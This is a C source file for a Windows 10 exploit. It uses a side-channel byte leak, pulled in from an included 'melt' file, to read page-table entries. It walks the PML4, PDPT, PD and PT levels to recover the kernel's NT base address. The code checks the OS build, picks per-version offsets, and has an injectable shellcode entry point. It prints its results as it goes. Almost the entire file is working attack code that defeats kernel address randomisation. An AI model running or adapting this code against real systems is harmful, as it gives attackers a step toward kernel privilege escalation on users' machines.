//////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>

//////////////////////////////////////////////////////////////////////////////

// Prototypes in order or ensure the function order when code is injected

void init_shellcode ( void );
int main ( void );

//////////////////////////////////////////////////////////////////////////////

//#define printf

//////////////////////////////////////////////////////////////////////////////

#include "pml4-leak-melt.c"

//////////////////////////////////////////////////////////////////////////////

// Build number
unsigned int build_number;

// RAM memory present
unsigned __int64 ram_memory;

// NT base address
unsigned __int64 nt_base = 0;

// Only useful for targets with 4GB RAM or more
unsigned int pte_fix_by_version = 0;

// PAGE DIRECTORY entry used by NT shadow pointers
unsigned int nt_pd_entry = 0;

//////////////////////////////////////////////////////////////////////////////

void init_shellcode ( void )
{
//  __debugbreak ();
  main ();
}

//////////////////////////////////////////////////////////////////////////////

int IsAdmin ( void )
{
  int ( *f_IsUserAnAdmin ) ( void );
  int ret = FALSE;

// Loading SHELL32
  LoadLibrary ( "shell32.dll" );

// Resolving function address
  f_IsUserAnAdmin = ( int ( * ) ( void ) ) GetProcAddress ( GetModuleHandle ( "shell32.dll" ) , "IsUserAnAdmin" );

// If function could be obtained
  if ( f_IsUserAnAdmin != NULL )
  {
  // Checking if user is Admin
    ret = f_IsUserAnAdmin ();
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

unsigned int get_build_number ()
{
  NTSTATUS ( *RtlGetVersion ) ( RTL_OSVERSIONINFOW * );
  RTL_OSVERSIONINFOW version;

  version.dwOSVersionInfoSize = sizeof ( version );
  RtlGetVersion = ( NTSTATUS ( * ) ( RTL_OSVERSIONINFOW * ) ) GetProcAddress ( GetModuleHandle ( "ntdll.dll" ) , "RtlGetVersion" ); 
  RtlGetVersion ( &version );

  return ( version.dwBuildNumber );
}

//////////////////////////////////////////////////////////////////////////////

unsigned __int64 get_system_memory ( void )
{
  MEMORYSTATUSEX mem;
  unsigned __int64 memory_size = 0;

// If memory could be taken
  if ( GetPhysicallyInstalledSystemMemory ( &memory_size ) == TRUE )
  {
  // Returning memory in bytes
    memory_size = memory_size * 1024;
  }
  else
  {
  // Setting struct size
    mem.dwLength = sizeof ( mem );

  // If memory could be taken
    if ( GlobalMemoryStatusEx ( &mem ) == TRUE )
    {
    // Returning memory in bytes
      memory_size = mem.ullTotalPhys;
    }
  }

  return ( memory_size );
}

//////////////////////////////////////////////////////////////////////////////

void print_pte ( char *address )
{
  unsigned char buffer [ 8 ];
  unsigned int cont;

// Cleaning buffer
  memset ( buffer , 0x99 , sizeof ( buffer ) );

// Leaking data
  for ( cont = 0 ; cont < sizeof ( buffer ) ; cont ++ )
  {
    leak_byte_always ( address + cont , &buffer [ cont ] );
  }

// Printing data
  for ( cont = 0 ; cont < sizeof ( buffer ) ; cont ++ )
  {
  // If it's a NEW LINE
    if ( cont % 16 == 0 )
    {
    // User message
      printf ( "\n%I64x: " , ( unsigned __int64 ) address + cont );
    }

  // Leaking next byte
    if ( buffer [ cont ] != 0x99 )
    {
      printf ( "%.2x " , buffer [ cont ] );
    }
    else
    {
      printf ( "XX " );
    }
  }

// New line
  printf ( "\n\n" );
}

//////////////////////////////////////////////////////////////////////////////

void print_ptes ( char *address )
{
  unsigned char buffer [ 0x20 ];
  unsigned int cont;

// Cleaning buffer
  memset ( buffer , 0x99 , sizeof ( buffer ) );

// Leaking data
  for ( cont = 0 ; cont < sizeof ( buffer ) ; cont ++ )
  {
    leak_byte_always ( address + cont , &buffer [ cont ] );
  }

// Printing data
  for ( cont = 0 ; cont < sizeof ( buffer ) ; cont ++ )
  {
  // If it's a NEW LINE
    if ( cont % 16 == 0 )
    {
    // User message
      printf ( "\n%I64x: " , ( unsigned __int64 ) address + cont );
    }

  // Leaking next byte
    if ( buffer [ cont ] != 0x99 )
    {
      printf ( "%.2x " , buffer [ cont ] );
    }
    else
    {
      printf ( "XX " );
    }
  }

// New line
  printf ( "\n\n" );
}

//////////////////////////////////////////////////////////////////////////////

unsigned __int64 get_partial_physical_address ( unsigned __int64 address )
{
  unsigned __int64 phy_address = 0;
  unsigned int cont;

// Printing tables
//  print_pte ( address );

// Reading 2 bytes of the physical address
  for ( cont = 1 ; cont < 3 ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always ( ( void * ) ( address + cont ) , ( unsigned char * ) &phy_address + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

// Returning only valid address
  phy_address = phy_address & 0x0000000000fff000;

//  printf ( "PHY: %I64x\n" , phy_address );

  return ( phy_address );
}

//////////////////////////////////////////////////////////////////////////////

unsigned __int64 get_physical_address ( unsigned __int64 address )
{
  unsigned __int64 phy_address = 0;
  unsigned int cont;

// Printing tables
//  print_pte ( address );

// Reading 4 bytes of the physical address
  for ( cont = 1 ; cont < 5 ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always_api ( ( void * ) ( address + cont ) , ( unsigned char * ) &phy_address + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

// Returning only valid address
  phy_address = phy_address & 0x000000fffffff000;

//  printf ( "PHY: %I64x\n" , phy_address );

  return ( phy_address );
}

//////////////////////////////////////////////////////////////////////////////

int is_nt_base ( unsigned __int64 pt_address , unsigned int pte )
{
  unsigned __int64 nt_base_shadow_code_delta;
  unsigned __int64 pte_phy_address = 0;
  unsigned int nt_base_pte_shadow_code_delta;
  unsigned int cont;
  int ret = FALSE;

// Checking 3 consecutive PTEs
  for ( cont = 0 ; cont < 3 ; cont ++ )
  {
  // If this OS is supported
    if ( pte_fix_by_version != 0 )
    {
    // If this PTE is not the right one
      if ( pte != pte_fix_by_version )
      {
      // Returning ERROR
        return ( FALSE );
      }
    }

  // If it's RS8 (20H1)
    if ( build_number == 19041 )
    {
    // 10MB from NT base ( 0xa00 * 0x1000 = 0xa00000 )
      nt_base_pte_shadow_code_delta = 0xa00;
    }
  // If it's RS6/RS7
    else
    {
    // 2MB from NT base ( 0x200 * 0x1000 = 0x200000 )
      nt_base_pte_shadow_code_delta = 0x200;
    }

  // Calculating NT physical base address delta
    nt_base_shadow_code_delta = 0x1000 * ( nt_base_pte_shadow_code_delta + pte + cont ); // Distance to shadow code

  // Getting physical address pointed by the PTE
    pte_phy_address = get_partial_physical_address ( pt_address + ( 0x8 * cont ) );
//    printf ( "PHY: %I64x\n" , pte_phy_address );

  // If the PTE physical address could be obtained
    if ( pte_phy_address != 0 )
    {
    // If this is aligned to 2MB
      if ( ( ( pte_phy_address - nt_base_shadow_code_delta ) & 0x1fffff ) == 0 )
      {
      // Returning OK
        ret = TRUE;  

      // Stop checking
        break;
      }
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

void print_nt_base ( unsigned __int64 pt_address , unsigned int pml4e , unsigned int pdpte , unsigned int pde , unsigned int pte )
{
  unsigned __int64 nt_base_shadow_code_delta;
  unsigned int nt_base_pte_shadow_code_delta;
  unsigned __int64 nt_pointer;
  unsigned int pte_base;

// If it's RS8 (20H1)
  if ( build_number == 19041 )
  {
  // 10MB from NT base ( 0xa00 * 0x1000 = 0xa00000 )
    nt_base_pte_shadow_code_delta = 0xa00;
  }
// If it's RS6/RS7
  else
  {
  // 2MB from NT base ( 0x200 * 0x1000 = 0x200000 )
    nt_base_pte_shadow_code_delta = 0x200;
  }

// If the target has 4GB or more
  if ( ram_memory >= 0x100000000L )
  {
  // Calculating NT physical base address delta
    nt_base_shadow_code_delta = ( nt_base_pte_shadow_code_delta + pte ) * 0x1000; // Minimal distance to shadow code: 0x200*0x1000 + pte*0x1000 = 2MB + pte*0x1000 
  }
// If the target has less than 4GB
  else
  {
  // Calculating NT physical base address delta (for Win10 RS7)
    nt_base_shadow_code_delta = ( nt_base_pte_shadow_code_delta + pte_fix_by_version ) * 0x1000; // Minimal distance to shadow code: 0x200 * 0x1000 = 2MB
  }

// User message
  printf ( "\n" );
//  printf ( "[+] NT pointer physical address: 0x%I64x\n" , get_partial_physical_address ( pt_address ) );
//  printf ( "[+] NT pointer physical address: 0x%I64x\n" , get_physical_address ( pt_address ) );
  printf ( "[+] NT base delta: 0x%I64x\n" , nt_base_shadow_code_delta );

// Calculating NT pointer
  nt_pointer = ( unsigned __int64 ) 0xffff000000000000 + ( ( unsigned __int64 ) 0x8000000000 * pml4e ) + ( ( unsigned __int64 ) 0x40000000 * pdpte ) + ( ( unsigned __int64 ) 0x200000 * pde ) + ( ( unsigned __int64 ) 0x1000 * pte );
  printf ( "[+] NT POINTER: 0x%I64x\n" , nt_pointer );

// Calculating NT base
  nt_base = nt_pointer - nt_base_shadow_code_delta; // Distance between NT BASE to "nt!KiDivideErrorFaultShadow"
  printf ( "[+] NT BASE: 0x%I64x\n" , nt_base );

// Setting PDE to be used for testing
  nt_pd_entry = pde;
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable_XX_consecutive ( unsigned __int64 pt_address , unsigned int pte_candidate )
{
  unsigned int cont;
  int ret = FALSE;

// Checking 3 consecutive entries
  for ( cont = 0 ; cont < 3 ; cont ++ )
  {
  // If it's a valid PTE
    if ( is_pte_executable_XX ( ( char * ) pt_address + ( ( pte_candidate + cont ) * 0x8 ) ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop finding
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int walk_pt_fast_check ( unsigned __int64 page_directory , unsigned int pml4e_self_ref , unsigned int pml4e , unsigned int pdpte , unsigned int pde )
{
  static unsigned int last_pde = 0x12345678;
  unsigned __int64 pt_address;
  unsigned int pte_candidate;
  unsigned char leaked_byte;
  int ret = FALSE;

/////////////

// PTE related to the OS
  pte_candidate = pte_fix_by_version; 

/////////////

// Calculating PT base address
  pt_address = ( unsigned __int64 ) 0xffff000000000000 + ( ( unsigned __int64 ) 0x8000000000 * pml4e_self_ref ) + ( ( unsigned __int64 ) 0x40000000 * pml4e ) + ( 0x200000 * pdpte ) + ( 0x1000 * pde );
//  printf ( "PT: %I64x\n" , pt_address );

// If it's a PTE 
  if ( is_pte_executable_XX_consecutive ( pt_address , pte_candidate ) == TRUE )
  {
  // User message
    printf ( "    [+] PT entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pt_address + pte_candidate * 0x8 , pte_candidate );

  // If it's NT base
    if ( is_nt_base ( ( unsigned __int64 ) pt_address + pte_candidate * 0x8 , pte_candidate ) == TRUE )
    {
    // Printing NT base
      print_nt_base ( ( unsigned __int64 ) pt_address + pte_candidate * 0x8 , pml4e , pdpte , pde , pte_candidate );

    // Returning OK
      ret = TRUE;
    }

  // If the last PDE is consecutive
    if ( pde == last_pde + 1 )
    {
    // All the PTEs are mapped (it occurs rarely under virtualization scenarios, no clear if it's a problem of Windows or the CPU) 
    // User message
      printf ( "     [-] TLBs error detected: Aborting exploit\n" );

    // Aborting exploit (HACK!)
      exit ( 0 );
    }
  // If the last PDE not is consecutive
    else
    {
    // Saving the current PDE
      last_pde = pde;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

void walk_pt_force_checking ( unsigned __int64 pt_address , unsigned int pte , unsigned int valid_ptes [] )
{
  unsigned int cont;

// Checking from 2 PTEs less to 2 PTEs more
  for ( cont = pte - 2 ; cont <= pte + 2 ; cont ++ )
  {
  // If this entry was detected before
    if ( valid_ptes [ cont ] == TRUE )
    {
    // Skipping this one
      continue;
    }

  // If this entry is a valid PTE
    if ( is_pte_executable_XX ( ( void * ) ( pt_address + cont * 0x8 ) ) == TRUE )
    {
    // User message
      printf ( "    [+] PT entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pt_address + cont * 0x8 , cont );

    // Setting this PTE as valid
      valid_ptes [ cont ] = TRUE;
    }
  }
}

//////////////////////////////////////////////////////////////////////////////

int walk_pt ( unsigned __int64 page_directory , unsigned int pml4e_self_ref , unsigned int pml4e , unsigned int pdpte , unsigned int pde )
{
  unsigned int valid_ptes [ 0x200 ];
  unsigned __int64 pt_address;
  unsigned char leaked_byte;
  unsigned int max_tries = 3;
  unsigned int tries;
  unsigned int cont;
  int ret = FALSE;

/////////////

// Initialyzing valid PTEs
  for ( cont = 0 ; cont < 0x200 ; cont ++ )
  {
  // Initialyzing next element
    valid_ptes [ cont ] = FALSE;
  }

/////////////

// Calculating PT base address
  pt_address = ( unsigned __int64 ) 0xffff000000000000 + ( ( unsigned __int64 ) 0x8000000000 * pml4e_self_ref ) + ( ( unsigned __int64 ) 0x40000000 * pml4e ) + ( 0x200000 * pdpte ) + ( 0x1000 * pde );
//  printf ( "PT: %I64x\n" , pt_address );

// Repeating until find a valid entry
  for ( tries = 0 ; tries < max_tries ; tries ++ )
  {
  // Moving through the table
    for ( cont = 0 ; cont < 0x200 ; cont ++ )
    {
    // If this entry wasn't processed before
      if ( valid_ptes [ cont ] == FALSE )
      {
      // If it's a valid PTE 
        if ( is_pte_executable_XX ( ( void * ) ( pt_address + cont * 0x8 ) ) == TRUE )
        {
        // User message
          printf ( "    [+] PT entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pt_address + cont * 0x8 , cont );

        // Setting this PTE as valid
          valid_ptes [ cont ] = TRUE;

        // If the target has 4GB or more
          if ( ram_memory >= 0x100000000L )
          {
          // If it's NT base
            if ( is_nt_base ( ( unsigned __int64 ) pt_address + cont * 0x8 , cont ) == TRUE )
            {
            // Printing NT base
              print_nt_base ( ( unsigned __int64 ) pt_address + cont * 0x8 , pml4e , pdpte , pde , cont );      

            // Returning OK
              return ( TRUE );
            }
          }
        // If the target has less than 4GB
          else
          {
          // Force checking this PT area
            walk_pt_force_checking ( pt_address , cont , valid_ptes );
          }
        }
      }
    }

  // Looking for 3 consecutive PTEs
    for ( cont = 0 ; cont < 0x200 ; cont ++ )
    {
    // If it's a valid entry
      if ( ( valid_ptes [ cont ] == TRUE ) && ( valid_ptes [ cont + 1 ] == TRUE ) && ( valid_ptes [ cont + 2 ] == TRUE ) )
      {
      // Printing NT base
        print_nt_base ( ( unsigned __int64 ) pt_address + cont * 0x8 , pml4e , pdpte , pde , cont );      

      // Returning OK
        return ( TRUE );
      }
    }  
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int walk_pd ( unsigned __int64 page_directory , unsigned int pml4e_self_ref , unsigned int pml4e , unsigned int pdpte )
{
  unsigned __int64 pd_address;
  unsigned __int64 pd_base;
  unsigned char leaked_byte;
  unsigned int tries;
  unsigned int cont;
  int ret = FALSE;

// Calculating PD base address
  pd_base = ( unsigned __int64 ) 0xffff000000000000 + ( ( unsigned __int64 ) 0x8000000000 * pml4e_self_ref ) + ( ( unsigned __int64 ) 0x40000000 * pml4e ) + ( 0x200000 * pdpte );
  pd_address = ( unsigned __int64 ) get_pt_from_va ( ( void * ) page_directory , pd_base );

// Repeating until find a valid entry
  for ( tries = 0 ; tries < 3 ; tries ++ )
  {
  // Moving through the table
    for ( cont = 0 ; cont < 0x200 ; cont ++ )
    {
    // Checking next entry
      if ( is_pte_executable_XX ( ( char * ) pd_address + ( cont * 0x8 ) ) == TRUE )
      {
      // User message
        printf ( "   [+] PD entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pd_address + cont * 0x8 , cont );

      // If the OS is supported and target has 4GB or more
        if ( ( pte_fix_by_version != 0 ) && ( ram_memory >= 0x100000000L ) )
        {
        // Moving to the PAGE TABLE
          ret = walk_pt_fast_check ( page_directory , pml4e_self_ref , pml4e , pdpte , cont );
        }
        else
        {
        // Moving to the PAGE TABLE
          ret = walk_pt ( page_directory , pml4e_self_ref , pml4e , pdpte , cont );
        }

      // If NT was found
        if ( ret == TRUE )
        {
        // Returning OK
          return ( TRUE );
        }
      }
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int walk_pdpt ( unsigned __int64 page_directory , unsigned int pml4e_self_ref , unsigned int pml4e )
{
  unsigned __int64 pdpt_address;
  unsigned __int64 pdpt_base;
  unsigned char leaked_byte;
  unsigned int tries;
  unsigned int cont;
  int ret = FALSE;

// Calculating PDPT base address
  pdpt_base = ( unsigned __int64 ) 0xffff000000000000 + ( ( unsigned __int64 ) 0x8000000000 * pml4e_self_ref ) + ( ( unsigned __int64 ) 0x40000000 * pml4e );
  pdpt_address = ( unsigned __int64 ) get_pd_from_va ( ( void * ) page_directory , pdpt_base );

// Repeating until find a valid entry
  for ( tries = 0 ; tries < 3 ; tries ++ )
  {
  // Moving through the table
    for ( cont = 0 ; cont < 0x200 ; cont ++ )
    {
    // Checking next entry
      if ( is_pte_executable_XX ( ( char * ) pdpt_address + ( cont * 0x8 ) ) == TRUE )
      {
      // User message
        printf ( "  [+] PDPT entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pdpt_address + cont * 0x8 , cont );

      // Moving to PAGE DIRECTORY
        ret = walk_pd ( page_directory , pml4e_self_ref , pml4e , cont );

      // If NT was found
        if ( ret == TRUE )
        {
        // Returning OK
          return ( TRUE );
        }
      }
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int walk_pml4 ( unsigned __int64 pml4_address , unsigned int pml4e_self_ref )
{
  unsigned __int64 page_directory;
  unsigned char leaked_byte;
  unsigned int cont;
  int ret = FALSE;

// Calculating Page Directory Base
  page_directory = ( ( unsigned __int64 ) pml4_address & 0xFFFFFF8000000000 );
//  printf ( "[+] PAGE DIRECTORY: %I64x\n" , page_directory );

// User message
  printf ( " [+] PML4 entry found: %I64x (entry 0x%x)\n" , ( unsigned __int64 ) pml4_address + 0x1f0 * 0x8 , 0x1f0 );

// Moving to the PDPT (0x1f0 is the PML4e for NT)
  ret = walk_pdpt ( page_directory , pml4e_self_ref , 0x1f0 );

// If NT was found
  if ( ret == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int main ( void )
{
  unsigned __int64 initial_time;
  unsigned int pml4_entry;
  void *pml4_address;
  int ret;

//////////

// If it's running as Administrator
  if ( IsAdmin () == TRUE )
  {
  // User message
    printf ( "[-] Error: KPTI is not implemented when running as Administrator\n" );
    printf ( " [-] This exploit doesn't work under these kind of scenarios.\n" );

  // Aborting operation
    return ( FALSE );
  }

//////////

// Getting "Windows 10" build number
  build_number = get_build_number ();

// Getting installed memory
  ram_memory = get_system_memory ();
//  ram_memory = 0x80000000; // forcing 2GB (for testing)
//  ram_memory = 0x100000000; // forcing 4GB (for testing)

// User message
  printf ( "[+] Win10 build number: %i\n" , build_number );
  printf ( "[+] RAM detected: %uGB\n" , ( unsigned int ) ( ram_memory / ( 1024 * 1024 * 1024 ) ) );

// If it's Win10 RS8 (20H1)
  if ( build_number == 19041 )
  {
  // Setting PTE offset
    pte_fix_by_version = 0x21;
  }
// If it's Win10 RS7
  else if ( build_number == 18363 )
  {
  // Setting PTE offset
    pte_fix_by_version = 0x151;
  }
// If it's Win10 RS6
  else if ( build_number == 18362 )
  {
  // User message
    printf ( "[!] WARNING: It's assuming that Win10 RS6 is newer than 18362.5XX\n" );

  // Setting PTE offset
//    pte_fix_by_version = 0x14d; // RS6 build 18362.20
    pte_fix_by_version = 0x151; // RS6 build 18362.535 or more
  }
// If this OS is not supported
  else
  {
  // User message
    printf ( "[-] Error: This OS is not supported\n" );

  // Aborting exploit
    return ( 0 );
  }
  
//////////

// User message
  printf ( "\n" );
  printf ( "[+] Leaking PML4...\n" );

// Taking initial time
  initial_time = GetTickCount ();

// If PML4 address could be obtained
  if ( get_pml4_address ( &pml4_entry , &pml4_address ) == TRUE )
  {
  // Printing results
    printf ( "[+] Elapsed time: %lli ms\n" , GetTickCount () - initial_time );
    printf ( "[+] PML4: %I64x (entry %x)\n" , ( unsigned __int64 ) pml4_address , pml4_entry );
  }
  else
  {
  // Printing results
    printf ( "[-] Error: PML4 couldn't be leaked\n" );

  // Returning error
    return ( 0 );
  }

//////////

// User message
  printf ( "\n" );
  printf ( "[+] Leaking NT base address...\n" );

// Taking initial time
  initial_time = GetTickCount ();

// Processing PML4
  ret = walk_pml4 ( ( unsigned __int64 ) pml4_address , pml4_entry );

// If NT address could be obtained
  if ( ret == TRUE )
  {
  // User message
    printf ( "\n" );
    printf ( "[+] Elapsed time: %lli ms\n" , GetTickCount () - initial_time );
    printf ( "[+] NT base address: 0x%I64x (entry 0x%x)\n" , ( unsigned __int64 ) nt_base , nt_pd_entry );
  }
// If NT address couldn't be obtained
  else
  {
  // User message
    printf ( "\n" );
    printf ( "[-] Error: NT base address couldn't be obtained\n" );
  }

// Returning PAGE DIRECTORY entry used by NT (just for testing)
  return ( ( int ) nt_pd_entry );
}

//////////////////////////////////////////////////////////////////////////////
